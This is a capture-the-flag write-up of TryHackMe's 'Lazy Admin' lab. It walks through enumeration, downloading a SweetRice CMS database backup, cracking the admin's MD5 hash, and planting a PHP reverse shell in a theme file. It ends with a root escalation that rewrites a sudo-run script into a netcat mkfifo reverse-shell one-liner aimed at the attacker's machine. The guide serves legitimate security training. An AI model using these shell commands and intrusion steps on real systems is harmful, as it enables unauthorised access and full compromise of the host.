---
title: "THM Lazy Admin"
date: 2020-10-10 20:00:00 -0700
categories: [THM, writeup]
tags: [writeup]
toc: true
---

> TryHackMe Lazy Admin: Easy linux machine to practice your skills

## Introduction

TryHackMe's Lazy Admin is an easy box made for beginners. 

It took me around four hours to get from deployment to root.

## nmap

As with all machines, the first thing we do is an nmap scan to get an idea of what is running on the box. TryHackMe's IP addresses are always different as all instances are personal. My IP address was ``10.10.16.134``.

Here is the command I used for the scan:

``nmap -sC -sV -o nmap.nmap 10.10.16.134``

Here is the output of the scan: 

```
kali@kali:~/Desktop/thm/lazyadmin$ nmap -sC -sV -o nmap.nmap 10.10.16.134
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-10 20:31 EDT
Nmap scan report for 10.10.16.134
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.39 seconds
```

Port 22 (SSH) and Port 80 (A web server) are open. It looks like the web server is utilizing apache, which is important information that will help us out later. Since we know that these two basic protocols are being run, we need to decide what exactly we want to attack. SSH is almost never an initial attack vector, so the next step would be to go to the web server and look for more information and find something to exploit.


![apache](https://i.imgur.com/MRzW5Kq.png)

A fresh apache installation... We aren't going to get anything out the page itself, so let's try and bruteforce some directories and files to find more information. The tool I am going to use for this is ``gobuster``. What this tool will so is look for files and directories after the IP. ``10.10.16.134/<find stuff here>``. Let's fire it up.

## gobuster

```
gobuster dir -u 10.10.71.169 -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,pdf
```

We specify that we want to look for directories with ``dir``, the url with ``-u``, the wordlist with ``-w``, and extensions for files with ``-x``. 


```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.71.169
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html,pdf
[+] Timeout:        10s
===============================================================
2020/10/08 20:28:43 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.pdf (Status: 403)
/.htaccess (Status: 403)
/.htaccess.pdf (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/content (Status: 301)
Progress: 8100 / 20470 (39.57%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/08 20:38:51 Finished
```

After I found ``/content/`` I knew I was in the right place so I terminated the scan. Let's take a look at the page: 

![sweetricesu](https://i.imgur.com/P2cV5Kk.png)

Awesome! We found the name of a CMS that is installed. Once you start going through a few boxes, you start to notice that you mainly exploit vulnerabilities in Content Management Systems. We're again at the stage where we idea where to go from here, so let's run gobuster again, this time looking for stuff ``10.10.16.134/content/<stuff here>``

```
===============================================================
kali@kali:~/Desktop/thm/lazyadmin$ gobuster dir -u 10.10.71.169/content -w /usr/share/wordlists/dirb/big.txt -x txt,html -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.71.169/content
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,html
[+] Timeout:        10s
===============================================================
2020/10/08 20:39:19 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.html (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.html (Status: 403)
/_themes (Status: 301)
/as (Status: 301)
/attachment (Status: 301)
/changelog.txt (Status: 200)
/images (Status: 301)
/inc (Status: 301)
/js (Status: 301)
/license.txt (Status: 200)
===============================================================
2020/10/08 20:42:26 Finished
===============================================================
```

## Web Server Enumeration

Lot's of new stuff to work with. The thing that sticks out to me is ``/as`` and ``/_themes``. Let's check this out.

![imgowo](https://i.imgur.com/UtsQMXS.png)

A login page!

![kekw](https://i.imgur.com/Uq0MAl0.png)

Files? Let's take a look at these. 

![kekw2](https://i.imgur.com/m7nrOE0.png)

php files that we are able to open... Awesome! This might be helpful later, let's look past that for now.

The problem at hand is that there is a login page we need to get past. Let's google the name of the CMS ``SweetRice``. It looks like it is extremely vulnerable and has several issues.

One of the exploits I found from Google is this: https://www.exploit-db.com/exploits/40718

## Exploiting SweetRice

```
Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
Date: 16-Sept-2016


Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip
```


Looks like we can grab the ``mysql_backup`` file from the web server. The CMS is hosted at ``/content/``, so let's add the file to the url we have. 

```
http://10.10.16.134/content/inc/mysql_backup/
```

![sqluwu](https://i.imgur.com/LaQ9bjG.png)

Perfect, let's download this to our machine and take a look at it: 

![ohlawd](https://i.imgur.com/E9Zwg35.png)

That's a lot of stuff to look through.. Let's look for an important word, like ``admin``. 

```
kali@kali:~/Desktop/thm/lazyadmin$ cat mysql_bakup_20191129023059-1.5.1.sql | grep admin
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

Let's look closely at this.. There's one line that sticks out right away.

```
\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\"
```

It looks like there's an admin user called ``manager`` and a password to go with it. ~~i spent a surprisingly large amount of time on this next part but~~ the password there is a md5 hash. I was able to verify this using an online hash identify tool. Let's crack it with the best password cracking tool ``hashcat``:

## Cracking Passwords with Hashcat

```
echo "42f749ade7f9e195bf475f37a44cafcb" > hash
```

```
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
```

```
42f749ade7f9e195bf475f37a44cafcb:Password123     
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: 42f749ade7f9e195bf475f37a44cafcb
Time.Started.....: Thu Oct  8 20:50:12 2020 (1 sec)
Time.Estimated...: Thu Oct  8 20:50:13 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   190.0 kH/s (0.38ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 40960/14344385 (0.29%)
Rejected.........: 0/40960 (0.00%)
Restore.Point....: 32768/14344385 (0.23%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: dyesebel -> loserface1

Started: Thu Oct  8 20:50:08 2020
Stopped: Thu Oct  8 20:50:14 2020
```

We have credentials!

```
manager:Password123
```

## Exploiting SweetRice cont.

Let's test these back at the login page...

![screenshot](https://i.imgur.com/8N4c56l.png)

We're in! Now we need to find some way to further exploit the server and get a shell. From looking up sweetrice, there are SEVERAL exploits and places where you are able to run PHP code. I tried several different things and nothing worked at all. I had to find my own attack vector. Thinking back to the second dirbuster, we found a themes folder with php files. Let's check out the themes section of the CMS.

![themelist](https://i.imgur.com/Ikazptk.png)

![kekw2](https://i.imgur.com/m7nrOE0.png)

## PHP Reverse Shell

Looks like they both have a footer file mentioned. Let's throw a PHP reverse shell in the footer theme file and see if it works.

I am going to use the shell linked [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

First thing, let's change the parameters of the shell so it calls back to my machine.

```
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Here's the output of the ``ip a`` command.

```
: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100                                                                                                  
    link/none                                                                                                                                                                                                      
    inet 10.2.19.105/17 brd 10.2.127.255 scope global tun0                                                                                                                                                         
       valid_lft forever preferred_lft forever                                                                                                                                                                     
    inet6 fe80::8976:cb5a:2972:3696/64 scope link stable-privacy                                                                                                                                                   
       valid_lft forever preferred_lft forever
```

Therefore we can change the parameters to this:

```
$ip = '10.2.19.105';  // CHANGE THIS
$port = 9001;       // CHANGE THIS
```

Now let's save it.

![donzo](https://i.imgur.com/75PrZHY.png)

Let's set up a listener to catch the reverse shell:

```
kali@kali:~/Desktop/thm/lazyadmin$ nc -nlvp 9001
listening on [any] 9001 ...
```

and now let's navigate to ``10.10.16.134/content/_themes/default/foot.php``. Looking back on the listener...

```
kali@kali:~/Desktop/thm/lazyadmin$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.2.19.105] from (UNKNOWN) [10.10.16.134] 44412
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 04:32:40 up  1:13,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

We have a shell! First things first, let's use python to spawn a better shell.

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

Now let's see if we can get the user flag..

```
$ cd /home/
cd /home/
$ ls
ls
itguy
$ cd itguy
cd itguy
$ ls 
ls
Desktop    Downloads  Picturesc Templates  backup.pl         mysql_login.txt
Documents  Music      Public    Videos     examples.desktop  user.txt
$cat user.txt
cat user.txt
THM{<redacted>}
$ 
```

## Priv Escalation

We have user! Now let's try to priv esc.

We'll try the classic ``sudo -l`` to see what we can run as root. 

```
$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

A perl script? Interesting. Let's print out the perl script and see if we can exploit it.

```
cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
$ 
```

So it just calls this script. Let's check this out..

```
$ cat /etc/copy.sh
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

Looks like it already has a reverse shell? Let's try changing it to our IP and port number of choice.

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.19.105 9002 >/tmp/f" > /etc/copy.sh
```

Let's start a listener on the attacking machine..

```
kali@kali:~$ nc -nlvp 9002
listening on [any] 9002 ...
```

Now let's run the perl script that calls the ``copy.sh`` script.

```
$ perl /home/itguy/backup.pl
perl /home/itguy/backup.pl
rm: cannot remove '/tmp/f': No such file or directory
```

Back on the listener..

```
kali@kali:~$ nc -nlvp 9002
listening on [any] 9002 ...
connect to [10.2.19.105] from (UNKNOWN) [10.10.16.134] 49694
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

!!!!! We have root! Let's claim our prize

```
# cat /root/root.txt
THM{<redacted>}
```

## Conclusion

This was an interesting box. The initial attack vector was putting a php reverse shell in a theme file for a footer, so that's pretty cool/interesting. A lot of the documentaion I found on SweetRice lead to nothing. There was a WAF at work that would not let me upload a PHP reverse shell via the attatchments feature or add php code to additional pages that I deployed, which were the primary attack vectors found on exploit.db. 

Finding the footer file was extremely lucky, without properly checking the results from my scan I would have ended up spending a very long time looking for another way in.

The priv escalation is also kind of interesting. They kind of give it to you on a silver platter but you can only make use of it if you have been messing around with pentesting labs for a while and recognize the syntax. 

Overall, I don't think this was that easy of a box because of the CMS vulnerabilities being largely misleading. It's not medium-tier difficulty but its not easy either.

If you want to start doing pentesting labs like this, I suggest you check out TryHackMe's GamingServer machine. My writeup for it is [here](https://natem135.github.io/posts/thm-gamingserver/).

In the future, I'm going to keep doing TryHackMe machines of this difficulty to build my skills up and eventually move onto HTB. 

Unrelated Note: If you like Coldplay [check out my song bracket ;o](https://i.imgur.com/9EF5Yh7.png)
